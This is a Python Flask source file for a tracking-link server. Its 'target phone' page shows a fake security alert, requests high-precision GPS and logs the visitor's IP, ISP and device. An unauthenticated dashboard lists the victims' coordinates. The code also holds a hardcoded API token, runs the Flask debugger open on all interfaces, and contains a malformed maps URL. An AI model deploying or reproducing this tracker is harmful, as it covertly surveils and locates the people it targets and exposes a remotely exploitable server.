from flask import Flask, request, render_template_string, jsonify
from datetime import datetime
from user_agents import parse
import uuid
import ipinfo
import sqlite3

# Modifying static folder paths to query hacker.jpg directly from your folder
app = Flask(__name__, static_folder='.', static_url_path='/')

# Your Threat Intel API token configuration
IPINFO_TOKEN = "207bb9581a8d9c"
handler = ipinfo.getHandler(IPINFO_TOKEN)
DB_FILE = "cyber_telemetry.db"

def init_db():
    """Initializes the persistent SQLite database file with session tracking."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT UNIQUE,
        timestamp TEXT,
        ip TEXT,
        method TEXT,
        lat TEXT,
        lon TEXT,
        isp TEXT,
        device_type TEXT,
        os TEXT
    )
    ''')
    conn.commit()
    conn.close()

# Initialize local database file matching the schema layout cleanly
init_db()

# --- TARGET PHONE INTERFACE ---
TRACKING_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Alert</title>
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #030712;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; justify-content: center; align-items: center; overflow: hidden;
        }
        #alert-box {
            width: 85%; max-width: 400px;
            background-color: #111827; border: 2px solid #ef4444; border-radius: 12px;
            padding: 30px 20px; text-align: center;
            box-shadow: 0 0 30px rgba(239, 68, 68, 0.4); box-sizing: border-box;
        }
        .icon { font-size: 50px; margin-bottom: 15px; display: inline-block; }
        h1 { color: #ef4444; font-size: 24px; margin: 0 0 10px 0; text-transform: uppercase; letter-spacing: 1px; font-weight: 800; }
        p { color: #e5e7eb; font-size: 15px; line-height: 1.5; margin: 0; }
        .details { margin-top: 15px; color: #9ca3af; font-size: 12px; border-top: 1px solid #1f2937; padding-top: 15px; }
    </style>
</head>
<body>
    <div id="alert-box">
        <span class="icon">⚠️</span>
        <h1>WARNING</h1>
        <p>YOU HAVE BEEN TRAPPED</p>
        <div class="details">Security Awareness Exercise Baseline Logged</div>
    </div>
    <script>
        // Trigger phone hardware vibration motors instantly on load
        if ('vibrate' in navigator) { 
            navigator.vibrate([200, 100, 200]); 
        }
        
        const session_id = "{{ session_id }}";
        
        // 1. Instantly log base page initialization 
        fetch('/save-telemetry', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ session_id: session_id, latitude: null, longitude: null, tracking_method: "Basic Session Init 🌐" })
        });

        // 2. Request GPS geolocation coordinates asynchronously
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    fetch('/save-telemetry', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            session_id: session_id,
                            latitude: position.coords.latitude, 
                            longitude: position.coords.longitude, 
                            tracking_method: "High-Precision GPS 🗺️" 
                        })
                    });
                },
                function(error) {
                    console.log("Location prompt rejected or unavailable.");
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
"""

# --- CENTRAL ANALYTICS MANAGEMENT OPERATING SYSTEM DASHBOARD ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SOC Command Center: Threat Telemetry</title>
    <style>
        body { 
            font-family: 'Courier New', Courier, monospace; 
            margin: 0; 
            padding: 40px; 
            background: linear-gradient(rgba(5, 10, 14, 0.85), rgba(5, 10, 14, 0.85)), 
                        url('/hacker.jpg') no-repeat center center fixed;
            background-size: cover;
            color: #00ff66; 
        }
        .container { max-width: 1300px; margin: 0 auto; position: relative; z-index: 2; }
        .caution-banner {
            background-color: rgba(255, 0, 0, 0.2); border: 2px solid #ff0033; color: #ff3333;
            padding: 15px; text-align: center; font-weight: bold; font-size: 22px;
            border-radius: 6px; margin-bottom: 30px; text-transform: uppercase;
            letter-spacing: 3px; box-shadow: 0 0 20px rgba(255, 0, 51, 0.4);
            animation: pulseGlow 2s infinite alternate;
        }
        @keyframes pulseGlow {
            0% { transform: translateY(0px); box-shadow: 0 0 15px rgba(255, 0, 51, 0.3); border-color: #aa0022; }
            100% { transform: translateY(-5px); box-shadow: 0 0 30px rgba(255, 0, 51, 0.7); border-color: #ff3333; }
        }
        h2 { color: #ffffff; text-shadow: 0 0 10px #00ff66; border-bottom: 2px solid #00ff66; padding-bottom: 10px; font-size: 28px; }
        table { width: 100%; border-collapse: collapse; margin-top: 25px; background: rgba(10, 20, 30, 0.92); border-radius: 8px; overflow: hidden; box-shadow: 0 8px 16px rgba(0,0,0,0.5); border: 1px solid #00ff66; }
        th, td { padding: 16px 20px; text-align: left; }
        th { background-color: #0c1a24; color: #00ff66; font-size: 14px; text-transform: uppercase; border-bottom: 2px solid #00ff66; }
        tr { border-bottom: 1px solid rgba(0, 255, 102, 0.2); }
        tr:hover { background-color: rgba(0, 255, 102, 0.12); }
        .badge { background-color: rgba(0, 255, 102, 0.15); color: #00ff66; padding: 4px 8px; border-radius: 4px; border: 1px solid #00ff66; font-weight: bold; }
        .location-gps { color: #3399ff; font-weight: bold; }
        .maps-btn { background-color: #ff3333; color: white; padding: 8px 14px; text-decoration: none; border-radius: 4px; font-size: 12px; font-weight: bold; border: 1px solid #ff0000; transition: 0.3s; }
        .maps-btn:hover { background-color: #cc0000; box-shadow: 0 0 20px rgba(255,0,0,0.6); }
        .device-text { color: #ffff33; }
    </style>
</head>
<body>
    <div class="container">
        <div class="caution-banner">CAUTION: HARDWARE THREAT INTELLIGENCE LAB ACTIVE ⚠️ ⚠️</div>
        <h2>Permanent Database Telemetry Logs 🕵️</h2>
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Timestamp</th>
                    <th>IP Address</th>
                    <th>Method</th>
                    <th>Coordinates (Lat, Lon)</th>
                    <th>Geolocate Action</th>
                    <th>ISP Network</th>
                    <th>Hardware Footprint</th>
                </tr>
            </thead>
            <tbody>
                {% for log in logs %}
                <tr>
                    <td>{{ log[0] }}</td>
                    <td>{{ log[2] }}</td>
                    <td><span class="badge">{{ log[3] }}</span></td>
                    <td>{{ log[4] }}</td>
                    <td><span class="location-gps">{{ log[5] }}, {{ log[6] }}</span></td>
                    <td>
                        {% if log[5] != "N/A" and log[5] != "None" %}
                        <a href="https://google.com{{ log[5] }},{{ log[6] }}" target="_blank" class="maps-btn">TRACER MAP 📍</a>
                        {% else %}
                        No Data
                        {% endif %}
                    </td>
                    <td>{{ log[7] }}</td>
                    <td><span class="device-text"><strong>{{ log[8] }}</strong></span> ({{ log[9] }})</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
"""

@app.route('/')
def view_dashboard():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT id, session_id, timestamp, ip, method, lat, lon, isp, device_type, os FROM logs ORDER BY id DESC')
    db_logs = cursor.fetchall()
    conn.close()
    return render_template_string(DASHBOARD_HTML, logs=db_logs)

@app.route('/track')
def track_device():
    unique_session = str(uuid.uuid4())
    return render_template_string(TRACKING_PAGE_HTML, session_id=unique_session)

@app.route('/save-telemetry', methods=['POST'])
def save_telemetry():
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # FIX: Safely parse Proxy chains from Pinggy without causing an AttributeError crash
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        raw_ip = request.environ.get('HTTP_X_FORWARDED_FOR')
        ip_address = raw_ip.split(',')[0].strip() if ',' in raw_ip else raw_ip.strip()
    else:
        ip_address = request.remote_addr
    
    ua_string = request.headers.get('User-Agent', '')
    user_agent = parse(ua_string)
    
    device_type = "Mobile 📱" if user_agent.is_mobile else "Tablet 📟" if user_agent.is_tablet else "PC/Laptop 💻"
    os_name = f"{user_agent.os.family}"
    isp_name = "Local Lab Connection"
    
    try:
        if ip_address and not ip_address.startswith(('127.', '192.168.', '10.', '172.')):
            details = handler.getDetails(ip_address)
            isp_name = getattr(details, 'org', 'Carrier Unknown')
    except Exception:
        pass

    post_data = request.get_json() or {}
    session_id = post_data.get('session_id')
    latitude = post_data.get('latitude')
    longitude = post_data.get('longitude')
    method = post_data.get('tracking_method')
    
    lat_val = round(float(latitude), 5) if (latitude is not None and str(latitude).strip() != "") else "N/A"
    lon_val = round(float(longitude), 5) if (longitude is not None and str(longitude).strip() != "") else "N/A"
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('SELECT id FROM logs WHERE session_id = ?', (session_id,))
    record_exists = cursor.fetchone()

    if record_exists and method == "High-Precision GPS 🗺️":
        cursor.execute(
            '''
            UPDATE logs
            SET method=?, lat=?, lon=?
            WHERE session_id=?
            ''',
            (method, str(lat_val), str(lon_val), session_id)
        )
    else:
        cursor.execute(
            '''
            INSERT INTO logs (session_id, timestamp, ip, method, lat, lon, isp, device_type, os)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''',
            (session_id, timestamp, ip_address, method, str(lat_val), str(lon_val), isp_name, device_type, os_name)
        )
        
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

if __name__ == '__main__':
    # Boot server with active execution debugger enabled
    app.run(host='0.0.0.0', port=5000, debug=True)
